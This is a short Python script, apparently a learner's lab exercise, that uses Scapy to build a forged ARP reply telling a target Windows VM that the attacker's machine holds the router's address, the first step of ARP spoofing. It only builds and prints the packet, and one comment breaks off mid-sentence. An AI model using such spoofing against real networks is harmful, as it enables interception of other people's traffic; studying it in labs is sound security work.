#/usr/bin/env python
from scapy.layers.l2 import ARP

# From Kali Linux VM to a Windows10 VM (In my case): Create an ARP Response, with fields:
# Send a packet to the Target IP saying I have the Routers (gateway) Address.
# op=2 (ARP Response. Default 1 is Request)). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
# psrc=[SOURCE_IP], tells TARGET the SOURCE is the ROUTER.
packet = ARP(op=2, pdst="192.168.63.174", hwdst="00-50-56-e8-00-20", psrc="192.168.63.2" )
# Show tells us the MAC Address of
print(packet.show())
print(packet.summary())